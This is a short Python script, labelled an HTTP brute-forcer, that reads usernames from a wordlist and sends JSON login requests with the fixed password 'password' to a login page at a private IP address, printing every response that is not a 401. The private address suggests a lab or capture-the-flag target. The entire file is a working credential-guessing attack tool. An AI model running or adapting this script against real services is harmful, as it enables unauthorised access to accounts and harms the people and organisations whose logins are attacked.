import requests
import sys
import argparse


parser = argparse.ArgumentParser(description="python http brute")
parser.add_argument("--wordlist")

args = parser.parse_args()

wordlist = args.wordlist

fp = open(wordlist, 'r')

url = 'http://192.168.164.106/login'

headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0',
        'Content-Type':'application/json',
        'Accept-Language':'en-US,en,q=0.5',
        'Connection':'close',
        "Origin":"http://192.168.164.106/"
        }

password = "password"

for line in fp:
    buffer = '{"username":"' + line.rstrip() + '","password":"' + password + '"}'
    x = requests.post(url,headers=headers,data=buffer)
    if (x.status_code != 401): 
        print(x.text)
